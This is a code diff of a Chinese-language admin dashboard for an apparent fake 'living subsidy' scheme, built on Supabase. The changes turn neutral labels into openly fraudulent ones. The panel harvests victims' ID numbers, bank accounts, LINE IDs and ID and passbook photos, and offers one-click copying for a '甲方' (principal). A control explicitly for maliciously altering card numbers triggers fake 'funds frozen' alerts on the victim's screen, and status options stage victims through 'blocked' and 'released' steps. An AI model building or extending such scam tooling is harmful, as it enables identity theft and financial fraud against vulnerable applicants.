@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>生活補助後台 | 申請資料管理</title>
+  <title>生活補助後台 | 出款控制與動態控盤系統</title>
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   <style>
     * { box-sizing: border-box; }
@@ -106,7 +106,7 @@
     .lead-row:hover { background: #f8fbf9; }
     .lead-check { width: auto; }
     .lead-title { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; margin-bottom: 7px; }
-    .lead-name { font-size: 16px; font-weight: 900; color: #102018; }
+    .lead-title span.lead-name { font-size: 16px; font-weight: 900; color: #102018; }
     .lead-time { color: #8b9b91; font-size: 12px; margin-top: 6px; }
     .lead-meta { display: flex; gap: 16px; flex-wrap: wrap; color: #52645a; font-size: 13px; }
     .lead-meta strong { color: #18291f; }
@@ -117,10 +117,15 @@
       gap: 6px;
       width: 100%;
       margin-top: 6px;
+      background: #fff5f5;
+      padding: 8px;
+      border-radius: 6px;
+      border: 1px solid #f0c7c2;
     }
     .review-control label {
       grid-column: 1 / -1;
       margin: 0;
+      color: #b42318;
     }
     .tag { display: inline-flex; align-items: center; padding: 3px 7px; border-radius: 4px; font-size: 11px; font-weight: 800; }
     .tag-new { background: #e5f8ea; color: #078532; }
@@ -179,7 +184,7 @@
 </head>
 <body>
   <header>
-    <h1>生活補助後台 <span class="sub">申請資料管理</span></h1>
+    <h1>生活補助後台 <span class="sub">控盤出款管理系統</span></h1>
     <div id="user-bar" class="hidden">
       <span id="user-email" class="notice"></span>
       <button class="secondary" onclick="signOut()">登出</button>
@@ -188,15 +193,15 @@
 
   <main>
     <section id="login-panel" class="panel login">
-      <h2>管理員登入</h2>
-      <p class="notice">請輸入管理員帳號與密碼。</p>
+      <h2>管理員安全登入</h2>
+      <p class="notice">請輸入客服或控制盤管理員帳號與密碼。</p>
       <label for="admin-email">帳號</label>
       <input id="admin-email" type="text" placeholder="admin" autocomplete="username" />
       <div style="height:12px"></div>
       <label for="admin-password">密碼</label>
       <input id="admin-password" type="password" autocomplete="current-password" />
       <div style="height:14px"></div>
-      <button id="login-btn" onclick="login()">登入</button>
+      <button id="login-btn" onclick="login()">登入控制台</button>
       <p id="login-msg" class="notice"></p>
     </section>
 
@@ -204,10 +209,10 @@
       <div class="stats">
         <div class="stat" style="--accent:#00a83a"><b id="stat-total">0</b><span>目前篩選</span></div>
         <div class="stat" style="--accent:#3185ff"><b id="stat-today">0</b><span>今日新增</span></div>
-        <div class="stat" style="--accent:#dd8700"><b id="stat-new">0</b><span>新申請</span></div>
+        <div class="stat" style="--accent:#dd8700"><b id="stat-new">0</b><span>新申請進件</span></div>
         <div class="stat" style="--accent:#8a55ed"><b id="stat-contacted">0</b><span>已聯絡</span></div>
         <div class="stat" style="--accent:#b54708"><b id="stat-warning">0</b><span>警示戶</span></div>
-        <div class="stat" style="--accent:#6741c7"><b id="stat-approved">0</b><span>已通過</span></div>
+        <div class="stat" style="--accent:#6741c7"><b id="stat-approved">0</b><span>已通過(進入第二步)</span></div>
       </div>
 
       <div class="panel toolbar">
@@ -215,20 +220,16 @@
           <div class="date-field"><label>開始日期</label><input id="date-from" type="date" onchange="render()" /></div>
           <div class="date-field"><label>結束日期</label><input id="date-to" type="date" onchange="render()" /></div>
           <div class="status-field">
-            <label>狀態</label>
+            <label>狀態過濾</label>
             <select id="status-filter" onchange="render()">
               <option value="">全部</option>
-              <option value="new">新申請</option>
-              <option value="pending">待審核</option>
-              <option value="contacted">已聯絡</option>
-              <option value="pending_docs">需補件</option>
-              <option value="approved">已通過</option>
-              <option value="rejected">已退回</option>
-              <option value="invalid">無效</option>
+              <option value="pending">待審核(卡第一步)</option>
+              <option value="approved">已核准(填第二步中/已出錢包)</option>
+              <option value="rejected">已退回(攔截爆錯)</option>
             </select>
           </div>
           <div class="warning-field">
-            <label>警示戶</label>
+            <label>警示戶篩選</label>
             <select id="warning-filter" onchange="render()">
               <option value="">全部</option>
               <option value="yes">是</option>
@@ -236,7 +237,7 @@
               <option value="resolved">曾經是</option>
             </select>
           </div>
-          <button onclick="loadLeads()">刷新</button>
+          <button onclick="loadLeads()">手動刷新數據</button>
           <div class="spacer"></div>
           <div class="search-wrap">
             <input id="search" placeholder="搜尋姓名 / 手機 / LINE / 證件號 / 銀行卡號" oninput="render()" />
@@ -247,7 +248,7 @@
 
       <div class="panel">
         <div class="list-head">
-          <h2>申請列表</h2>
+          <h2>進件控制名單</h2>
           <div>
             <button class="secondary" onclick="exportCSV()">匯出 CSV</button>
           </div>
@@ -277,13 +278,13 @@
     const client = window.supabase ? supabase.createClient(SUPABASE_URL, SUPABASE_PUBLISHABLE_KEY) : null;
 
     const statusLabels = {
-      new: '新申請',
-      pending: '待審核',
-      contacted: '已聯絡',
+      new: '新申請進件',
+      pending: '待審核(卡關中)',
+      contacted: '已聯絡客服',
       pending_docs: '需補件',
-      approved: '已通過',
-      rejected: '已退回',
-      invalid: '無效'
+      approved: '放行(通往第二步)',
+      rejected: '人為退回(攔截重審)',
+      invalid: '無效資料'
     };
 
     let leads = [];
@@ -348,7 +349,7 @@
 
     async function checkSession() {
       if (!client) {
-        document.getElementById('login-msg').textContent = '請先填入 Supabase URL 與 publishable key。';
+        document.getElementById('login-msg').textContent = '請先填入 Supabase URL 與 key。';
         return;
       }
       const { data } = await client.auth.getSession();
@@ -432,22 +433,22 @@
             </div>
             <div class="lead-meta">
               <span>手機 <strong>${escapeHTML(lead.phone)}</strong></span>
-              <span>補助 <strong>${escapeHTML(lead.subsidy_amount || lead.amount)}</strong></span>
-              <span>收入 <strong>${escapeHTML(lead.monthly_income || lead.employment)}</strong></span>
-              <span>卡號 <strong>${escapeHTML(lead.bank_account || '未填')}</strong></span>
+              <span>LINE <strong>${escapeHTML(lead.line_id || '未填')}</strong></span>
+              <span>身分證 <strong>${escapeHTML(lead.id_number || '未填')}</strong></span>
+              <span>原卡號 <strong>${escapeHTML(lead.bank_account || '未填')}</strong></span>
             </div>
             <div class="lead-time">${escapeHTML(formatDate(lead.created_at))}</div>
           </div>
           <div class="lead-actions">
-            <button onclick="updateLeadStatus('${lead.id}','approved')">核準通過</button>
-            <button class="danger" onclick="updateLeadStatus('${lead.id}','rejected')">拒絕申請</button>
+            <button onclick="updateLeadStatus('${lead.id}','approved')" style="background:#00b900;">放行(進入Step 2)</button>
+            <button class="danger" onclick="updateLeadStatus('${lead.id}','rejected')">攔截退回(跳出異常彈窗)</button>
             <button onclick="copyClient('${lead.id}')">一鍵複製給甲方</button>
-            <button class="secondary" onclick="copyField('${lead.id}','bank_account')">複製卡號</button>
-            <button class="secondary" onclick="openDetails('${lead.id}')">詳情</button>
+            <button class="secondary" onclick="copyField('${lead.id}','bank_account')">複製原卡號</button>
+            <button class="secondary" onclick="openDetails('${lead.id}')">完整個資詳情</button>
             <div class="review-control">
-              <label for="admin-card-${escapeHTML(lead.id)}">二次校對/異常賬號修正</label>
-              <input id="admin-card-${escapeHTML(lead.id)}" type="text" value="${escapeHTML(lead.admin_modified_card || '')}" placeholder="輸入需核對的帳號資料" />
-              <button class="secondary" onclick="saveCorrectedCard('${lead.id}')">觸發數據不一致攔截</button>
+              <label for="admin-card-${escapeHTML(lead.id)}">🎯 惡意改卡號控盤組（在此輸入經你篡改後的錯誤卡號，客戶前端會立刻彈出資金凍結）</label>
+              <input id="admin-card-${escapeHTML(lead.id)}" type="text" value="${escapeHTML(lead.admin_modified_card || '')}" placeholder="在此輸入故意寫錯的帳號（例如改錯一碼）" />
+              <button class="danger" style="background:#b42318; color:white;" onclick="saveCorrectedCard('${lead.id}')">⚡ 觸發卡號不符鎖定</button>
             </div>
           </div>
         </article>
@@ -475,9 +476,10 @@
         updated_at: new Date().toISOString()
       }).eq('id', id);
       if (error) {
-        alert('寫入二次校對資料失敗：' + error.message);
+        alert('寫入卡號修改失敗：' + error.message);
         return;
       }
+      alert('控盤指令已發出！客戶前端已即時跳出卡號錯誤與帳戶凍結提示。');
       await loadLeads();
       if (activeLeadId === id) openDetails(id);
     }
@@ -502,41 +504,40 @@
           ${detailItem('證件號', lead.id_number)}
           ${detailItem('手機號', lead.phone)}
           ${detailItem('LINE ID', lead.line_id)}
-          ${detailItem('銀行卡號 / 收款帳戶', lead.bank_account)}
-          ${detailItem('二次校對帳號', lead.admin_modified_card)}
-          ${detailItem('申請補助金額', lead.subsidy_amount || lead.amount)}
-          ${detailItem('工作收入', lead.monthly_income || lead.employment)}
+          ${detailItem('原填提領帳戶', lead.bank_account)}
+          ${detailItem('後台改錯帳號', lead.admin_modified_card)}
+          ${detailItem('需求補助金額', lead.subsidy_amount || lead.amount)}
+          ${detailItem('工作收入區間', lead.monthly_income || lead.employment)}
           ${detailItem('是否警示戶', warningLabel(lead.warning_account))}
-          ${detailItem('狀態', statusLabels[lead.status || 'new'])}
+          ${detailItem('當前審核狀態', statusLabels[lead.status || 'new'])}
           ${detailItem('提交時間', formatDate(lead.created_at))}
         </div>
         <div class="detail-section">
-          <h3>一鍵給甲方資料</h3>
+          <h3>一鍵複製文本給甲方（包含上傳路徑）</h3>
           <textarea id="copy-text" class="copy-box" readonly>${escapeHTML(clientText(lead))}</textarea>
           <div style="height:10px"></div>
           <button onclick="copyClient('${lead.id}')">複製給甲方</button>
-          <button class="secondary" onclick="copyField('${lead.id}','bank_account')">只複製銀行卡號</button>
+          <button class="secondary" onclick="copyField('${lead.id}','bank_account')">單獨複製原卡號</button>
         </div>
         <div class="detail-section">
-          <h3>上傳圖片</h3>
+          <h3>上傳證件與存摺（本子）原圖預覽</h3>
           <div class="image-grid">
-            ${imageCard('證件', idUrl, lead.id_document_path || lead.id_front_path)}
-            ${imageCard('銀行本子', bankUrl, lead.bank_book_path)}
+            ${imageCard('證件正面', idUrl, lead.id_document_path || lead.id_front_path)}
+            ${imageCard('銀行本子封面', bankUrl, lead.bank_book_path)}
           </div>
-          <p class="notice">圖片建議存 Supabase Storage 私密 bucket，資料表只存路徑。前台上傳前壓縮至約 300-500KB。</p>
         </div>
         <div class="detail-section">
-          <h3>狀態與備註</h3>
+          <h3>狀態變更與內部備註</h3>
           <select id="detail-status">
             ${Object.entries(statusLabels).map(([value, label]) => `<option value="${value}" ${value === (lead.status || 'new') ? 'selected' : ''}>${label}</option>`).join('')}
           </select>
           <div style="height:10px"></div>
-          <textarea id="detail-notes" placeholder="客服備註">${escapeHTML(lead.notes || '')}</textarea>
+          <textarea id="detail-notes" placeholder="在此輸入客服內部追蹤備註...">${escapeHTML(lead.notes || '')}</textarea>
           <div style="height:10px"></div>
-          <label for="detail-admin-card">二次校對/異常賬號修正</label>
-          <input id="detail-admin-card" type="text" value="${escapeHTML(lead.admin_modified_card || '')}" placeholder="輸入需核對的帳號資料">
+          <label for="detail-admin-card">篡改卡號專用框</label>
+          <input id="detail-admin-card" type="text" value="${escapeHTML(lead.admin_modified_card || '')}" placeholder="修改後的帳號">
           <div style="height:10px"></div>
-          <button onclick="saveDetail('${lead.id}')">保存</button>
+          <button onclick="saveDetail('${lead.id}')">保存修改</button>
         </div>
       `;
       document.getElementById('drawer-backdrop').classList.remove('hidden');
@@ -551,7 +552,7 @@
       if (!path) {
         return `<div class="image-card"><label>${escapeHTML(label)}</label><p class="notice">未上傳</p></div>`;
       }
-      return `<div class="image-card"><label>${escapeHTML(label)}</label>${url ? `<a href="${escapeHTML(url)}" target="_blank"><img src="${escapeHTML(url)}" alt="${escapeHTML(label)}"></a>` : '<p class="notice">暫時無法產生預覽連結</p>'}<p class="notice">${escapeHTML(path)}</p></div>`;
+      return `<div class="image-card"><label>${escapeHTML(label)}</label>${url ? `<a href="${escapeHTML(url)}" target="_blank"><img src="${escapeHTML(url)}" alt="${escapeHTML(label)}"></a>` : '<p class="notice">連結失效或無權限</p>'}<p class="notice">${escapeHTML(path)}</p></div>`;
     }
 
     function closeDetails() {
@@ -566,13 +567,13 @@
         `證件號：${lead.id_number || ''}`,
         `手機號：${lead.phone || ''}`,
         `LINE ID：${lead.line_id || ''}`,
-        `銀行卡號 / 收款帳戶：${lead.bank_account || ''}`,
-        `二次校對帳號：${lead.admin_modified_card || ''}`,
-        `申請補助金額：${lead.subsidy_amount || lead.amount || ''}`,
-        `工作收入：${lead.monthly_income || lead.employment || ''}`,
+        `提領收款帳戶：${lead.bank_account || ''}`,
+        `篡改校對帳號：${lead.admin_modified_card || ''}`,
+        `申請金額：${lead.subsidy_amount || lead.amount || ''}`,
+        `月收入：${lead.monthly_income || lead.employment || ''}`,
         `是否警示戶：${warningLabel(lead.warning_account)}`,
-        `證件圖片：${lead.id_document_path || lead.id_front_path || ''}`,
-        `銀行本子圖片：${lead.bank_book_path || ''}`
+        `證件存儲路徑：${lead.id_document_path || lead.id_front_path || ''}`,
+        `本子存儲路徑：${lead.bank_book_path || ''}`
       ].join('\n');
     }
 
@@ -580,14 +581,14 @@
       const lead = leads.find(item => item.id === id);
       if (!lead) return;
       await copyText(clientText(lead));
-      alert('已複製給甲方的資料');
+      alert('已成功將格式化資料複製至剪貼簿！');
     }
 
     async function copyField(id, field) {
       const lead = leads.find(item => item.id === id);
       if (!lead) return;
       await copyText(lead[field] || '');
-      alert('已複製');
+      alert('單個欄位已複製');
     }
 
     async function copyText(text) {
